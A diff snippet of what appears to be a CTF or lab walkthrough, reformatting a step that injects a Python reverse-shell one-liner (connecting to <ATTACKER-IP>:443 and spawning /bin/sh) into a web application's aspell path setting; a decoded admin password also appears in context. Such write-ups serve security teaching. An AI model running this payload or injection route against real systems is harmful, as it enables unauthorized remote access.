@@ -122,7 +122,10 @@ Decoded Admin Password: xWinter1995x!
           Set the Spell engine to PSpellShell.
           In the Path to aspell field, input a reverse shell command targeting your local listener IP and port:
 
-```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER-IP>",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ```
+```bash 
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER-IP>",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+ ```
+
 Click Save changes.
 
    3. Triggering the Reverse Shell:
